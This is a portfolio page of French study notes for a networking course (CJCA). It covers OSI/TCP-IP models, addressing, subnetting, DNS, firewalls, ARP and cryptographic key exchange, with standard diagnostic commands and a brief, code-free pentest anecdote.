<!DOCTYPE html>

<html lang="fr">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
<title>(CJCA) | c4tz</title>
<link href="../static/css/style.css" rel="stylesheet"/>
<style>
/* Polished typography */
.prose{max-width:1000px}
.prose p{font-size:15.5px;line-height:1.8}
.prose h1,.prose h2,.prose h3{font-weight:700;letter-spacing:.2px}
.prose h1{font-size:30px}
.prose h2{font-size:22px;margin-top:22px}
.prose h3{font-size:18px;margin-top:18px}
.prose li{margin:6px 0}
/* code blocks more readable */
.prose pre{font-size:13.5px;line-height:1.6;word-wrap:break-word;white-space:pre-wrap}
/* soft tables */
.prose table{background:rgba(255,255,255,.01)}
.prose th{color:#cfd6e3;font-weight:600}
</style><style>
.prose pre,
pre {
  background: transparent !important;
  border: none !important;
  box-shadow: none !important;
  border-radius: 0 !important;
  padding: 0 !important;
  margin: 0.75rem 0 !important;
}
.prose pre code,
pre code,
code, kbd, samp {
  background: transparent !important;
  border: none !important;
  box-shadow: none !important;
}
.prose pre code,
pre code {
  display: block;
  white-space: pre-wrap !important;
  word-break: break-word !important;
}
</style></head>
<div class="page">
<aside class="sidebar">
<a class="brand" href="../about.html">
<img alt="" class="avatar" src="https://m.media-amazon.com/images/I/511PnEDrRfL._AC_.jpg"/>
<div><h1>c4tz</h1><p>Portfolio &amp; writeups</p></div>
</a>
<nav class="snav">
<ul>
<li><a alt="" href="../writeup.html"> Write Up</a></li>
<li><a alt="" href="../portfolio.html"> Portfolio</a></li>
<li><a alt="" href="../contact.html"> Contacts</a></li>
<li><a alt="" href="../about.html"> About</a></li>
</ul>
</nav>
</aside>
<div class="content">
<div class="topbar">
<img alt="" class="avatar" src="https://m.media-amazon.com/images/I/511PnEDrRfL._AC_.jpg"/>
<strong>c4tz</strong>
</div>
<main class="main">
<h2 class="page-title">(CJCA)</h2>
<section class="prose"><article class="page sans" id="cjca"><header><h1 class="page-title">compte rendu CJCA</h1><p class="page-description"></p></header><div class="page-body"><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Network Foundations</strong></summary><div class="indented"><h1><strong>Introduction aux Réseaux</strong></h1>
<p>Un réseau est un ensemble de dispositifs interconnectés (appelés nœuds) capables d’échanger des données au travers de liens (médias filaires ou sans-fil).</p>
<p>Les réseaux permettent le partage de ressources, la communication et l’accès distant aux données.</p>
<h2>Concepts essentiels</h2>
<table class="simple-table">
<thead>
<tr>
<th>Concept</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Nœud (Node)</td>
<td>Appareil connecté au réseau</td>
</tr>
<tr>
<td>Lien (Link)</td>
<td>Chemin de communication, filaire ou sans-fil</td>
</tr>
<tr>
<td>Partage de données</td>
<td>Objectif principal : échanger et distribuer de l’information</td>
</tr>
</tbody>
</table>
<h2>Types de réseaux</h2>
<table class="simple-table">
<thead>
<tr>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>LAN</td>
<td>Réseau local, rapide, couvrant une zone réduite (maison, entreprise)</td>
</tr>
<tr>
<td>WAN</td>
<td>Réseau étendu, reliant de multiples LAN à l’échelle nationale ou mondiale</td>
</tr>
</tbody>
</table>
<h1><strong>Modèles OSI et TCP/IP</strong></h1>
<h2>Modèle OSI (7 couches)</h2>
<table class="simple-table">
<thead>
<tr>
<th>Couche</th>
<th>Fonction principale</th>
<th>Exemples</th>
</tr>
</thead>
<tbody>
<tr>
<td>1 – Physique</td>
<td>Transmission électrique/optique des bits</td>
<td>RJ45, fibre</td>
</tr>
<tr>
<td>2 – Liaison</td>
<td>MAC, trames, commutation</td>
<td>Switch, ARP</td>
</tr>
<tr>
<td>3 – Réseau</td>
<td>Routage, IP</td>
<td>Routeur, IP</td>
</tr>
<tr>
<td>4 – Transport</td>
<td>TCP/UDP, ports, fiabilité</td>
<td><code>netstat</code>, <code>ss</code></td>
</tr>
<tr>
<td>5 – Session</td>
<td>Gestion de sessions</td>
<td>API</td>
</tr>
<tr>
<td>6 – Présentation</td>
<td>Format, chiffrement</td>
<td>TLS/SSL</td>
</tr>
<tr>
<td>7 – Application</td>
<td>Protocoles applicatifs</td>
<td>HTTP, DNS</td>
</tr>
</tbody>
</table>
<h3>Commandes associées</h3>
<div class="codehilite">
<pre><span></span><code>ip<span class="w"> </span>link
ip<span class="w"> </span>addr
arp<span class="w"> </span>-a
ss<span class="w"> </span>-tulnp
curl<span class="w"> </span>http://example.com
</code></pre>
</div>
<h2>Modèle TCP/IP (4 couches)</h2>
<table class="simple-table">
<thead>
<tr>
<th>Couche</th>
<th>Correspondance OSI</th>
<th>Exemples</th>
</tr>
</thead>
<tbody>
<tr>
<td>Link</td>
<td>1 + 2</td>
<td>Ethernet, Wi-Fi</td>
</tr>
<tr>
<td>Internet</td>
<td>3</td>
<td>IP, ICMP</td>
</tr>
<tr>
<td>Transport</td>
<td>4</td>
<td>TCP, UDP</td>
</tr>
<tr>
<td>Application</td>
<td>5-7</td>
<td>HTTP, DNS, FTP</td>
</tr>
</tbody>
</table>
<h1><strong>Composants d’un Réseau</strong></h1>
<h2>Équipements terminaux (End Devices)</h2>
<p>Dispositifs générant ou recevant des données : ordinateurs, smartphones, IoT, serveurs.</p>
<p>Commandes utiles :</p>
<div class="codehilite">
<pre><span></span><code>ip<span class="w"> </span>addr
getmac
ipconfig<span class="w"> </span>/all
</code></pre>
</div>
<h2>Switches (couche 2)</h2>
<p>Acheminent les trames selon les adresses MAC.</p>
<p>Afficher la table MAC :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>bridge<span class="w"> </span>fdb<span class="w"> </span>show
</code></pre>
</div>
<h2>Routeurs (couche 3)</h2>
<p>Déterminent le chemin des paquets IP.</p>
<p>Commandes :</p>
<div class="codehilite">
<pre><span></span><code>ip<span class="w"> </span>route
traceroute<span class="w"> </span><span class="m">8</span>.8.8.8
</code></pre>
</div>
<h1><strong>Communication Réseau : MAC, IP, Ports</strong></h1>
<h2>Adresse MAC (couche 2)</h2>
<p>Identifiant matériel unique de 48 bits.</p>
<div class="codehilite">
<pre><span></span><code>ip<span class="w"> </span>link
</code></pre>
</div>
<h2>Adresse IP (couche 3)</h2>
<p>Permet l’identification logique d’un hôte.</p>
<p>IPv4 : <code>192.168.1.10</code></p>
<p>IPv6 : <code>2001:db8::1</code></p>
<div class="codehilite">
<pre><span></span><code>ip<span class="w"> </span>addr
</code></pre>
</div>
<h2>Ports (couche 4)</h2>
<table class="simple-table">
<thead>
<tr>
<th>Service</th>
<th>Port</th>
<th>Protocole</th>
</tr>
</thead>
<tbody>
<tr>
<td>HTTP</td>
<td>80</td>
<td>TCP</td>
</tr>
<tr>
<td>HTTPS</td>
<td>443</td>
<td>TCP</td>
</tr>
<tr>
<td>DNS</td>
<td>53</td>
<td>UDP/TCP</td>
</tr>
<tr>
<td>SSH</td>
<td>22</td>
<td>TCP</td>
</tr>
</tbody>
</table>
<p>Lister les ports ouverts :</p>
<div class="codehilite">
<pre><span></span><code>ss<span class="w"> </span>-tulnp
</code></pre>
</div>
<h2>ARP : résolution IP → MAC</h2>
<div class="codehilite">
<pre><span></span><code>arp<span class="w"> </span>-a
ping<span class="w"> </span><span class="m">192</span>.168.1.1
arp<span class="w"> </span>-a
</code></pre>
</div>
<h1><strong>DHCP – Attribution Dynamique d’Adresses</strong></h1>
<p>Le processus  :</p>
<ol>
<li>Discover</li>
<li>Offer</li>
<li>Request</li>
<li>Acknowledge</li>
</ol>
<p>Renouveler un bail DHCP :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>dhclient<span class="w"> </span>-r
sudo<span class="w"> </span>dhclient
</code></pre>
</div>
<p>Fichiers et paramètres associés :</p>
<div class="codehilite">
<pre><span></span><code>ip<span class="w"> </span>route
cat<span class="w"> </span>/etc/resolv.conf
</code></pre>
</div>
<h1><strong>NAT – Network Address Translation</strong></h1>
<p>Permet à plusieurs machines internes d’utiliser une seule adresse IP publique.</p>
<p>Types de NAT :</p>
<ul>
<li>PAT (NAT overload, le plus courant)</li>
<li>NAT statique</li>
<li>NAT dynamique</li>
</ul>
<p>Vérifier son IP publique :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>ifconfig.me
</code></pre>
</div>
<h1><strong>DNS – Résolution Noms → IP</strong></h1>
<h3>Processus de résolution DNS</h3>
<ol>
<li>Recherche dans le cache local</li>
<li>DNS récursif</li>
<li>Root servers</li>
<li>TLD (.com)</li>
<li>Serveur autoritaire</li>
</ol>
<p>Commandes essentielles :</p>
<div class="codehilite">
<pre><span></span><code>nslookup<span class="w"> </span>example.com
dig<span class="w"> </span>example.com
cat<span class="w"> </span>/etc/resolv.conf
</code></pre>
</div>
<h1><strong>Réseaux Sans-Fil</strong></h1>
<p>Technologies :</p>
<ul>
<li>2.4 GHz : grande portée, plus d’interférences</li>
<li>5 GHz : haute performance, courte portée</li>
<li>Hotspot : partage de connexion mobile</li>
<li>Cell tower : couverture 4G/5G</li>
</ul>
<p>Commandes utiles :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>iwlist<span class="w"> </span>wlan0<span class="w"> </span>scan
iwconfig
</code></pre>
</div>
<h1><strong>Sécurité Réseau (Firewall, IDS/IPS)</strong></h1>
<h2>Pare-feu (Firewall)</h2>
<h3>iptables (Linux)</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>iptables<span class="w"> </span>-L<span class="w"> </span>-v
sudo<span class="w"> </span>iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>icmp<span class="w"> </span>-j<span class="w"> </span>DROP
</code></pre>
</div>
<h3>Windows</h3>
<div class="codehilite">
<pre><span></span><code><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">rule</span> <span class="n">name</span><span class="p">=</span><span class="n">all</span>
</code></pre>
</div>
<p>Types de pare-feu :</p>
<ul>
<li>Packet filtering (couches 3-4)</li>
<li>Stateful firewall</li>
<li>Application firewall (L7)</li>
<li>NGFW (Deep Packet Inspection)</li>
</ul>
<h2>IDS / IPS</h2>
<p>Lancer Suricata :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>suricata<span class="w"> </span>-c<span class="w"> </span>/etc/suricata/suricata.yaml<span class="w"> </span>-i<span class="w"> </span>eth0
</code></pre>
</div>
<p>Voir les alertes :</p>
<div class="codehilite">
<pre><span></span><code>cat<span class="w"> </span>/var/log/suricata/fast.log
</code></pre>
</div>
<p>Méthodes de détection :</p>
<ul>
<li>Analyse par signatures</li>
<li>Analyse comportementale (anomalies)</li>
</ul>
<h1><strong>Parcours Complet d’un Paquet (Accès à un Site Web)</strong></h1>
<h2>Étapes techniques</h2>
<table class="simple-table">
<thead>
<tr>
<th>Étape</th>
<th>Description</th>
<th>Commande associée</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Connexion Wi-Fi</td>
<td><code>iwconfig</code></td>
</tr>
<tr>
<td>2</td>
<td>Attribution IP via DHCP</td>
<td><code>dhclient</code>, <code>ip addr</code></td>
</tr>
<tr>
<td>3</td>
<td>Résolution DNS</td>
<td><code>nslookup</code>, <code>dig</code></td>
</tr>
<tr>
<td>4</td>
<td>Construction du paquet TCP/IP</td>
<td><code>ss -t</code></td>
</tr>
<tr>
<td>5</td>
<td>NAT sur le routeur</td>
<td><code>curl ifconfig.me</code></td>
</tr>
<tr>
<td>6</td>
<td>Routage internet</td>
<td><code>traceroute</code></td>
</tr>
<tr>
<td>7</td>
<td>Réception, décapsulation et affichage</td>
<td>wireshark, tcpdump</td>
</tr>
</tbody>
</table>
<h1><strong>Commandes d’Analyse Réseau</strong></h1>
<h3>Sniffer ARP</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-nn<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w"> </span>arp
</code></pre>
</div>
<h3>Sniffer HTTP</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-nn<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w"> </span>port<span class="w"> </span><span class="m">80</span>
</code></pre>
</div>
<h3>Capture complète en .pcap</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>wlan0<span class="w"> </span>-w<span class="w"> </span>capture.pcap
</code></pre>
</div>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction to Networking</strong></summary><div class="indented"><p><figure class="image"><a href="../static/image/cjca/image.png"><img alt="" src="../static/image/cjca/image.png"/></a></figure></p>
<h2>Vue d’ensemble &amp; segmentation réseau</h2>
<ul>
<li>Un réseau = des machines qui communiquent via des <strong>médias</strong> (cuivre, fibre, Wi-Fi…) et des <strong>protocoles</strong> (TCP, UDP…).</li>
<li>Un <strong>réseau plat /24</strong> (tout le monde dans le même LAN) est simple mais dangereux :
<ul>
<li>difficile de filtrer finement,</li>
<li>facile pour un attaquant de se déplacer latéralement sans être vu.</li>
</ul></li>
<li>Segmentation = créer <strong>plusieurs petits réseaux</strong> avec des ACL, pare-feux, VLAN… → ajoute des <strong>couches de défense</strong>.</li>
<li>Analogie de la maison :
<ul>
<li>clôture ≈ ACL entre réseaux,</li>
<li>éclairage ≈ supervision / logs,</li>
<li>buissons ≈ IDS/IPS qui découragent les scans.</li>
</ul></li>
</ul>
<h3>Erreur classique du pentester</h3>
<ul>
<li>Le pentester met par habitude un <strong>/24</strong> alors que le réseau est en <strong>/25</strong> des deux côtés.</li>
<li>Résultat : il reste coincé sur le réseau « clients » et ne voit jamais le réseau « serveurs / DC » pourtant accessible.</li>
<li>Message clé : <strong>toujours vérifier le masque + la table de routage</strong>, pas se fier aux habitudes.</li>
</ul>
<h2>Structure « Home / Company network »</h2>
<ul>
<li>Internet = un ensemble de <strong>réseaux subdivisés</strong> (ex : réseau maison, réseau entreprise) reliés par des <strong>routeurs</strong> et l’<strong>ISP</strong>.</li>
<li>L’accès à un site web :
<ul>
<li>on tape un <strong>FQDN / URL</strong>,</li>
<li>le routeur → FAI,</li>
<li>FAI → <strong>DNS</strong> pour traduire le nom en IP,</li>
<li>le paquet va vers le <strong>webserver</strong> de l’entreprise,</li>
<li>la réponse revient via les routeurs jusqu’à notre IP source.</li>
</ul></li>
</ul>
<h3>Bonus sécurité sur le schéma d’entreprise</h3>
<p>Idéalement, l’entreprise aurait <strong>au moins 5 réseaux séparés</strong> :</p>
<ol>
<li><strong>DMZ</strong> pour le webserver (exposé Internet).</li>
<li><strong>Réseau postes clients</strong> séparé des serveurs et des autres postes.</li>
<li><strong>Réseau d’administration</strong> pour routeurs / switches.</li>
<li><strong>Réseau VoIP</strong> pour les téléphones IP (latence + confidentialité).</li>
<li><strong>Réseau imprimantes</strong> (très difficile à sécuriser, vecteur d’attaque et de persistance).</li>
</ol>
<h3>Histoire de l’imprimante piégée</h3>
<ul>
<li>Pentest physique pendant le COVID : l’attaquant envoie une <strong>imprimante backdoorée</strong>.</li>
<li>La boîte la branche sur le LAN → la machine fait un <strong>reverse shell</strong> vers l’attaquant et récupère les <strong>identifiants du domain admin</strong>.</li>
<li>Si le réseau avait été correctement segmenté (imprimante isolée, pas d’accès Internet, pas de port 445 vers les postes, etc.), l’attaque aurait été beaucoup plus compliquée voire impossible.</li>
</ul>
<h2>Types de réseaux</h2>
<p><strong>Termes courants :</strong></p>
<ul>
<li><strong>WAN</strong> : ensemble de LAN (Internet ou WAN interne).</li>
<li><strong>LAN</strong> : réseau local (maison, bureau), souvent en IP privées RFC1918.</li>
<li><strong>WLAN</strong> : même chose en Wi-Fi.</li>
<li><strong>VPN</strong> : fait comme si on était branché sur un autre réseau.</li>
</ul>
<p><strong>Types de VPN :</strong></p>
<ul>
<li><strong>Site-to-Site</strong> : relie deux sites (routeurs/firewalls) en partageant des plages réseau.</li>
<li><strong>Remote Access VPN</strong> : un client crée une interface virtuelle (ex : OpenVPN de HTB → interface <code>tun0</code>).
<ul>
<li><strong>Split tunneling</strong> : seules certaines routes passent dans le VPN (ex : 10.10.10.0/24), le reste sort par Internet normal.</li>
</ul></li>
<li><strong>SSL VPN</strong> : dans le navigateur (RDP/Apps streamées).</li>
</ul>
<p><strong>Termes « de livre » à connaître mais moins utilisés :</strong></p>
<ul>
<li><strong>GAN</strong> (global), <strong>MAN</strong> (ville / métropole), <strong>PAN/WPAN</strong> (Bluetooth, IoT court-portée).</li>
</ul>
<h2>Topologies réseau</h2>
<ul>
<li><p><strong>Physique</strong> = comment c’est câblé/branché ;</p>
<p><strong>Logique</strong> = comment les données circulent réellement.</p></li>
</ul>
<p>Types principaux :</p>
<ul>
<li><strong>Point-to-Point</strong> : lien direct entre deux hôtes.</li>
<li><strong>Bus</strong> : tous sur le même média partagé.</li>
<li><strong>Étoile</strong> : tous connectés à un point central (switch/routeur).</li>
<li><strong>Anneau</strong> : chaque hôte a un voisin avant/après, circulation dans un sens, peut utiliser un <strong>token</strong>.</li>
<li><strong>Mesh</strong> (maillé) :
<ul>
<li><strong>full mesh</strong> : tous les nœuds reliés entre eux (fiabilité, surtout WAN),</li>
<li><strong>partial mesh</strong> : seulement certains nœuds sont très connectés.</li>
</ul></li>
<li><strong>Arbre</strong> : extension d’étoile, très proche de ce qu’on trouve dans les gros LAN (hiérarchie de switches).</li>
<li><strong>Hybride</strong> : combinaison de plusieurs topo.</li>
<li><strong>Daisy chain</strong> : hôtes en chaîne.</li>
</ul>
<h2>Proxies</h2>
<ul>
<li><strong>Proxy = médiateur de couche 7</strong> qui voit et traite le contenu (sinon c’est juste une passerelle/gateway).</li>
<li>Types principaux :
<ol>
<li><strong>Forward proxy</strong> (proxy de sortie) : le client parle au proxy, qui parle à Internet pour lui.
<ul>
<li>Ex : proxy web d’entreprise, Burp en mode classique.</li>
</ul></li>
<li><strong>Reverse proxy</strong> (proxy d’entrée) : reçoit les requêtes pour un service interne et les relaie.
<ul>
<li>Ex : Cloudflare, ModSecurity (WAF), reverse proxy sur machine compromise pour rebondir.</li>
</ul></li>
<li><strong>(Non-)transparent</strong> :
<ul>
<li>transparent = le client ne sait pas qu’il parle à un proxy,</li>
<li>non-transparent = le client est configuré pour l’utiliser (proxy du navigateur, etc.).</li>
</ul></li>
</ol></li>
</ul>
<h2>Modèles OSI et TCP/IP + encapsulation</h2>
<ul>
<li>Deux modèles :
<ul>
<li><strong>OSI</strong> : 7 couches (Physique → Application).</li>
<li><strong>TCP/IP</strong> : 4 couches (Link, Internet, Transport, Application).</li>
</ul></li>
<li>Les couches supérieures (appli) utilisent les services des couches inférieures (transport, réseau, lien, physique).</li>
</ul>
<p><strong>PDU par couche (OSI) :</strong></p>
<ul>
<li>L1 : <strong>bit</strong></li>
<li>L2 : <strong>trame</strong></li>
<li>L3 : <strong>paquet</strong></li>
<li>L4 : <strong>segment/datagramme</strong></li>
<li>L5-7 : <strong>données</strong></li>
</ul>
<p><strong>Encapsulation :</strong></p>
<ul>
<li>À l’envoi : Data appli → segment TCP/UDP → paquet IP → trame Ethernet → bits.</li>
<li>À la réception : décapsulation dans l’ordre inverse.</li>
</ul>
<p><figure class="image"><a href="../static/image/cjca/6633572b-c841-4281-8dab-73474965f773.png"><img alt="" src="../static/image/cjca/6633572b-c841-4281-8dab-73474965f773.png"/></a></figure></p>
<h2>Couches OSI (détail)</h2>
<ul>
<li><strong>1 Physique</strong> : signaux électriques / optiques / radio, câbles, Wi-Fi.</li>
<li><strong>2 Liaison</strong> : trames, détection d’erreurs, MAC, VLAN.</li>
<li><strong>3 Réseau</strong> : adressage logique, routage, IP, ICMP, OSPF, etc.</li>
<li><strong>4 Transport</strong> : fiabilité, segmentation, contrôle de flux (<strong>TCP</strong>, <strong>UDP</strong>).</li>
<li><strong>5 Session</strong> : ouverture/gestion de sessions logiques.</li>
<li><strong>6 Présentation</strong> : format des données, chiffrement, compression.</li>
<li><strong>7 Application</strong> : interfaces au logiciel (HTTP, FTP, SMTP…).</li>
</ul>
<h2>Modèle TCP/IP (détail)</h2>
<ul>
<li><strong>Link</strong> : accès au média (Ethernet, Wi-Fi…).</li>
<li><strong>Internet</strong> : adressage + routage (IP, ICMP, etc.).</li>
<li><strong>Transport</strong> : TCP (connexion, fiabilité) &amp; UDP (datagrammes).</li>
<li><strong>Application</strong> : protocoles de niveau appli (HTTP, DNS, SSH, etc.).</li>
</ul>
<p>Tâches importantes :</p>
<ul>
<li><strong>Adressage logique &amp; routage</strong> : IP.</li>
<li><strong>Contrôle d’erreur / flux &amp; ports</strong> : TCP/UDP.</li>
<li><strong>Résolution de noms</strong> : DNS.</li>
</ul>
<h2>IPv4, masque, binaire, CIDR &amp; subnetting</h2>
<h3>IPv4</h3>
<ul>
<li>Adresse <strong>32 bits</strong>, 4 octets de 0 à 255 (<code>x.x.x.x</code>).</li>
<li>Composée d’une <strong>partie réseau</strong> et d’une <strong>partie hôte</strong>.</li>
<li>Anciennes <strong>classes A/B/C</strong> historiques, remplacées par <strong>CIDR</strong>.</li>
</ul>
<h3>Masque et CIDR</h3>
<ul>
<li>Masque = suite de bits à 1 (réseau) puis à 0 (hôte).</li>
<li>Notation <strong>CIDR</strong> : <code>IP/prefix</code> (ex : <code>192.168.10.39/24</code>).</li>
<li>Le /n indique le <strong>nombre de bits de réseau</strong>.</li>
</ul>
<h3>Binaire</h3>
<ul>
<li>Chaque octet = 8 bits, poids 128-64-32-16-8-4-2-1.</li>
<li>Conversion décimal ↔ binaire pour comprendre comment le masque découpe l’adresse.</li>
</ul>
<h3>Subnetting</h3>
<ul>
<li>But : découper un bloc en <strong>plus petits sous-réseaux</strong>.</li>
<li>À partir de <code>IP</code> + <code>masque</code> on détermine :
<ul>
<li>adresse de réseau,</li>
<li>broadcast,</li>
<li>premier / dernier hôte,</li>
<li>nombre d’hôtes utilisables.</li>
</ul></li>
<li><p>Méthode :</p>
<ul>
<li>bits à 0 dans la partie hôte → plage possible,</li>
<li><p>tout à 0 = <strong>network</strong>, tout à 1 = <strong>broadcast</strong>.</p>
<p><figure class="image"><a href="../static/image/cjca/ac97acaf-e20c-4733-ae2a-e2a495966b4c.png"><img alt="" src="../static/image/cjca/ac97acaf-e20c-4733-ae2a-e2a495966b4c.png"/></a></figure></p></li>
</ul></li>
</ul>
<h3>Mental subnetting</h3>
<ul>
<li>D’abord, repérer <strong>quel octet varie</strong> (/8, /16, /24, /32).</li>
<li>Puis, utiliser le <strong>reste de la division par 8</strong> pour trouver la taille du bloc (2^(8–reste)).
<ul>
<li>ex : <code>/25</code> → 25 % 8 = 1 → taille bloc = 2^(8–1)=128.</li>
</ul></li>
<li>Les plages se répètent de <code>0, +128, +128, …</code> dans l’octet concerné.</li>
<li>Toujours se souvenir : 0 = network, dernière adresse = broadcast, le reste = hôtes.</li>
</ul>
<h2>MAC &amp; ARP</h2>
<p><figure class="image"><a href="../static/image/cjca/what-is-arp.jpg"><img alt="" src="../static/image/cjca/what-is-arp.jpg"/></a></figure></p>
<h3>MAC</h3>
<ul>
<li>MAC = <strong>adresse physique</strong> de 48 bits / 6 octets, en hex (<code>DE:AD:BE:EF:13:37</code>).</li>
<li>Deux parties :
<ul>
<li><strong>OUI</strong> (3 premiers octets) = constructeur,</li>
<li><strong>NIC</strong> (3 derniers) = identifiant interface.</li>
</ul></li>
<li>Certains bits indiquent :
<ul>
<li>unicast / multicast,</li>
<li>globale / locale (admin).</li>
</ul></li>
</ul>
<h3>ARP</h3>
<ul>
<li>Sert à faire la <strong>correspondance IP ↔ MAC</strong> sur un LAN.</li>
<li><strong>ARP Request</strong> (broadcast) « Who has IP X ? tell IP Y ».</li>
<li><strong>ARP Reply</strong> (unicast) « IP X is at MAC Z ».</li>
<li>Cache ARP sur chaque machine.</li>
</ul>
<h3>Vecteurs d’attaque</h3>
<ul>
<li><strong>MAC spoofing</strong> : changer son MAC pour bypasser un filtrage.</li>
<li><strong>MAC flooding</strong> : saturer la CAM table d’un switch.</li>
<li><strong>ARP spoofing / poisoning</strong> : empoisonner le cache ARP d’une victime pour devenir <strong>MITM</strong> entre victime et gateway.</li>
</ul>
<h2>IPv6 (idées clés)</h2>
<ul>
<li>Adresse <strong>128 bits</strong> en hex, 8 blocs séparés par <code>:</code> (ex : <code>fe80::dd80:b1a9:6687:2d3b/64</code>).</li>
<li>Beaucoup d’adresses → plus besoin de NAT.</li>
<li>Plusieurs IPv6 possibles par interface.</li>
<li>Types d’adresses : <strong>unicast</strong>, <strong>anycast</strong>, <strong>multicast</strong> (pas de broadcast).</li>
<li>Utilise fortement le <strong>hex</strong> ; règles de simplification (<code>::</code>, suppression des zéros en tête).</li>
</ul>
<h2>Terminologie/protocoles à connaître</h2>
<ul>
<li><p>Famille de protocoles réseau, sécurité, routage, authent, etc.</p>
<p>Exemples importants pour un red-teamer / admin :</p>
<ul>
<li><strong>SSH, FTP, SMTP, HTTP, SMB, NFS, SNMP, NTP</strong></li>
<li><strong>VLAN, VTP, STP, RIP, OSPF, EIGRP</strong></li>
<li><strong>HSRP, VRRP</strong> (redondance routeur)</li>
<li><strong>SIP, VoIP</strong></li>
<li><strong>VPN, IPsec, PPTP, GRE</strong></li>
<li><strong>NAT</strong></li>
<li><strong>TLS/SSL, PGP, PEAP/EAP</strong></li>
</ul></li>
<li>L’idée principale : avoir un <strong>vocabulaire de base</strong> pour comprendre la doc, les configs et les rapports d’audit.</li>
</ul>
<h2>Diffie–Hellman &amp; ECDH</h2>
<ul>
<li><strong>Diffie–Hellman (DH)</strong> :
<ul>
<li>Chaque partie génère un secret privé, échange une valeur publique, puis calcule le même secret partagé via des opérations mathématiques (arithmétique modulaire).</li>
<li>Avantage : pas besoin de clé partagée à l’avance.</li>
<li>Limite : <strong>vulnérable au Man-in-the-Middle</strong> si l’échange n’est pas authentifié (ex : pas de certificat, pas de signature).</li>
</ul></li>
<li><strong>ECDH (Elliptic Curve Diffie–Hellman)</strong> :
<ul>
<li>Même principe mais sur les <strong>courbes elliptiques</strong>.</li>
<li>À sécurité égale, les clés sont plus petites et les calculs plus rapides → idéal pour mobiles, VPN, TLS modernes.</li>
</ul></li>
</ul>
<blockquote>
<p>En pratique, dans TLS (HTTPS, SMTPS, etc.), on trouve souvent des suites de chiffrement du type ECDHE-RSA-AES256-GCM-SHA384 : ECDHE pour l’échange de clé éphémère, RSA pour la signature du serveur, AES-GCM pour le chiffrement.</p>
</blockquote>
<h3>Petit test pratique</h3>
<p>Afficher la suite de chiffrement et le type d’échange de clé utilisé par un site :</p>
<div class="codehilite">
<pre><span></span><code>openssl<span class="w"> </span>s_client<span class="w"> </span>-connect<span class="w"> </span>www.example.com:443<span class="w"> </span>-tls1_2<span class="w"> </span>&lt;/dev/null<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'Cipher|Protocol'</span>
</code></pre>
</div>
<p>Tu verras souvent <code>ECDHE</code> dans le nom de la suite.</p>
<h2>RSA &amp; ECDSA</h2>
<ul>
<li><strong>RSA</strong> : basé sur la difficulté de factoriser un grand nombre composite.
<ul>
<li>Utilisé pour : chiffrement, <strong>signature</strong>, échange de clés (dans les anciens TLS « RSA key exchange »), certificats X.509, PKI…</li>
<li>Plus les clés sont grandes, plus c’est lourd côté CPU (et lent sur du vieux matos).</li>
</ul></li>
<li><strong>ECDSA</strong> : version elliptique de DSA.
<ul>
<li>Sert uniquement pour la <strong>signature</strong> (authentification et intégrité).</li>
<li>Plus efficace qu’RSA à niveau de sécurité comparable → très utilisé pour certificats serveurs modernes, SSH, etc.</li>
</ul></li>
</ul>
<h3>Commandes utiles</h3>
<p>Générer une paire de clés pour tes labs :</p>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Clé RSA 4096 bits</span>
ssh-keygen<span class="w"> </span>-t<span class="w"> </span>rsa<span class="w"> </span>-b<span class="w"> </span><span class="m">4096</span><span class="w"> </span>-f<span class="w"> </span>~/.ssh/id_rsa_lab

<span class="c1"># Clé elliptique moderne</span>
ssh-keygen<span class="w"> </span>-t<span class="w"> </span>ed25519<span class="w"> </span>-f<span class="w"> </span>~/.ssh/id_ed25519_lab
</code></pre>
</div>
<h2>IKE &amp; PSK (VPN)</h2>
<p><strong>IKE (Internet Key Exchange)</strong> est la brique qui permet à IPsec de négocier les paramètres de chiffrement dans un VPN :</p>
<ul>
<li>Utilise <strong>Diffie–Hellman (ou ECDH)</strong> pour fabriquer le secret partagé.</li>
<li>Peut combiner <strong>certificats (RSA/ECDSA)</strong> ou <strong>Pre-Shared Key (PSK)</strong> pour authentifier les deux extrémités.</li>
</ul>
<p>Deux modes principaux :</p>
<ul>
<li><strong>Main mode</strong> : plus de messages, meilleure confidentialité de l’identité.</li>
<li><strong>Aggressive mode</strong> : moins de messages → plus rapide, mais identités exposées plus tôt, donc moins sécurisé.</li>
</ul>
<p><strong>PSK</strong> : mot de passe partagé entre les deux gateways / clients.</p>
<p>Avantage : simple à déployer.</p>
<p>Inconvénients : difficile à distribuer en sécurité ; si le PSK fuit, tout le VPN est compromis (d’où l’intérêt des certificats).</p>
<h1>Protocoles d’authentification</h1>
<p>Les protocoles d’authentification servent à <strong>prouver qui tu es</strong> avant d’autoriser l’accès à un service.</p>
<h2>Exemples importants</h2>
<ul>
<li><strong>Kerberos</strong> : tickets délivrés par un <strong>KDC</strong> dans les domaines AD.</li>
<li><strong>SSL/TLS</strong> : authentifie le serveur (certificat) et parfois le client (mutual TLS).</li>
